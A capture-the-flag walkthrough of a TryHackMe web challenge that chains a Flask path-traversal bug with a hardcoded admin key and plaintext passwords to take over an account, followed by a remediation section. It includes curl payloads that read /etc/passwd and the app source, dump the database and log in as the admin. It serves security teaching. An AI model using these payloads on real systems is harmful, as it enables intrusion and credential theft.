# TryHackMe: ValenFind — One Path-Traversal Bug to Root File Read, a Leaked Key, and Full Account Takeover

*A walkthrough of the "ValenFind" web challenge from TryHackMe's Love at First
Breach 2026 event. A single unauthenticated path-traversal flaw lets us read any
file on the box as root. We use it to read the app's own source, recover a
hardcoded admin key, export the entire database — which stores passwords in
plaintext — and log in as the administrator. No account required at any step.*

> The flag, the leaked admin key, and recovered passwords are redacted. ValenFind
> is an authorized training challenge on TryHackMe; everything here was performed
> against a legal practice target. Values shown as `<redacted>` are real on the box
> but withheld here.

---

## TL;DR — the whole chain

`GET /api/fetch_layout?layout=…` joins a user-controlled filename to a base
directory **without any traversal or absolute-path validation** → read `/etc/passwd`
to prove arbitrary file read **as root** → read `/opt/Valenfind/app.py` to recover a
**hardcoded `ADMIN_API_KEY`** → send that key to `/api/admin/export_db` and download
the whole **SQLite database (still unauthenticated)** → passwords are stored in
**plaintext** → log in as the admin `cupid` → **total compromise**.

Anonymous → admin, in under a minute, fully scriptable.

## The target

```bash
export IP=<target-ip>
```

ValenFind is a Flask app (Werkzeug 3.0.1, Python 3.12.3) served on port 5000:

```
http://$IP:5000   →  ValenFind (Flask/Werkzeug)
```

It's a Valentine-themed matchmaking web app. Web apps that let you pick a "theme"
or "layout" are worth a hard look — anywhere the server opens a file whose name
came from the request is a candidate for **path traversal / local file read**.

## The vulnerability: `/api/fetch_layout` opens whatever you name

The theming endpoint builds a file path straight from the `layout` query parameter:

```python
layout_file = request.args.get('layout', 'theme_classic.html')
base_dir = os.path.join(os.getcwd(), 'templates', 'components')
file_path = os.path.join(base_dir, layout_file)   # abs path wins; ../ never stripped
with open(file_path, 'r') as f:
    return f.read()
```

Two Python details make this fatal:

- **`os.path.join(base, "/etc/passwd")` returns `/etc/passwd`.** An absolute path in
  the second argument throws the base directory away entirely.
- **`../` is never removed**, so a relative payload climbs out of the intended
  folder just as easily.

The only "protection" is a substring blocklist for `.db` / `seeder.py` — trivially
sidestepped, and irrelevant to reading source or system files. Crucially, the
endpoint has **no session check**, so it's reachable *before* authentication. And
the process runs as **root** (`/proc/self/cmdline` → `/usr/bin/python3
/opt/Valenfind/app.py`, `HOME=/root`), so "read any file" means *any* file.

## Step 1 — prove the primitive: read `/etc/passwd`

```bash
curl -G "http://$IP:5000/api/fetch_layout" --data-urlencode 'layout=/etc/passwd'
# -> root:x:0:0:root:/root:/bin/bash ...   (real contents)
```

A **negative control** confirms this is genuine filesystem access, not some
reflected echo — asking for a file that doesn't exist returns a real `errno 2`:

```bash
curl -G "http://$IP:5000/api/fetch_layout" --data-urlencode 'layout=/etc/passwd_nope'
# -> Error loading theme layout: [Errno 2] No such file or directory
```

That distinction matters in a real report: the error proves the server actually
`open()`s the path we control.

## Step 2 — read the app's own source, recover the admin key

The best file to read with an LFI primitive is usually the application source — it
holds the secrets. We know the process cmdline points at `/opt/Valenfind/app.py`:

```bash
curl -G "http://$IP:5000/api/fetch_layout" --data-urlencode 'layout=/opt/Valenfind/app.py'
# -> ADMIN_API_KEY = "<redacted-admin-key>"
```

The source hands us a **hardcoded admin API key**. Reading source also tells us what
*not* to waste time on: the Flask `secret_key = os.urandom(24)` is random per boot,
so cookie forgery is a dead end — the credential leak is the real path.

## Step 3 — export the entire database with the leaked key

The admin key gates a database-export endpoint. Since the key is now ours, this call
is still effectively **unauthenticated**:

```bash
curl -H 'X-Valentine-Token: <redacted-admin-key>' \
     "http://$IP:5000/api/admin/export_db" -o leak.db     # 200, ~16 KB SQLite

sqlite3 leak.db 'SELECT username,password FROM users;'
# -> cupid|<redacted-password>   (+ 10 other users, all plaintext)
```

The database stores passwords in **plaintext** — no hashing at all. That turns a
data leak into instant account takeover for **every one of the 11 users**, plus
their emails, phone numbers, and home addresses (real PII in a live breach).

## Step 4 — admin account takeover

With the admin's plaintext password in hand, we simply log in:

```bash
curl -i -d 'username=cupid&password=<redacted-password>' "http://$IP:5000/login"
# -> 302 /dashboard, session decodes to {"user_id":8,"username":"cupid"}
```

We're now `cupid`, the administrator. The challenge flag is tucked into the admin's
`address` field in the exported database:

```
THM{<redacted>}
```

Anonymous request → root-level file read → leaked key → full DB → admin login. Every
rung was unauthenticated or authenticated only by a secret the app leaked itself.

## Impact

**Critical — CVSS 3.1 9.8** (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`). The entire chain
is remote, unauthenticated, deterministic, and scriptable in seconds:

- **Arbitrary file read as root** — source code, secrets, `/etc/passwd`, any file.
- **Complete database exfiltration** — all 11 users' usernames, **plaintext
  passwords**, emails, phone numbers, and addresses (PII with GDPR/CCPA breach
  obligations).
- **Account takeover of every user, including the admin**, verified by login.

## Recommended fix — break every rung

1. **Confine the path in `fetch_layout`.** Resolve with `os.path.realpath` and reject
   anything whose resolved path isn't inside the components directory, or better,
   map a fixed **allow-list** of theme names to files. And **don't run the app as
   root** — least privilege would have contained the file read.
2. **Remove the hardcoded `ADMIN_API_KEY`.** Require a real authenticated admin
   session for `/api/admin/export_db`, and rotate the exposed key (treat it as
   burned).
3. **Hash passwords** with bcrypt/argon2 (e.g.
   `werkzeug.security.generate_password_hash`). Plaintext storage turned a read bug
   into a full credential breach.

## Takeaways

- **Never build a file path from user input without confining it.** `os.path.join`
  does *not* protect you — an absolute path or `../` walks right out. Resolve and
  prefix-check, or allow-list.
- **An LFI is a key-finder.** The first file to read is almost always the app's own
  source; secrets hardcoded there hand you the next stage for free.
- **Plaintext passwords convert any read bug into total account takeover.** Hashing
  isn't optional — it's the blast-radius limiter.
- **Least privilege matters.** The same bug reading `/etc/shadow` as root vs. one
  low-priv template file is the difference between "critical" and "annoying."

Thanks for reading. ValenFind is a compact lesson in how a single unglamorous
path-traversal bug — plus a hardcoded key and plaintext passwords — collapses an
entire app from the outside, no login required.
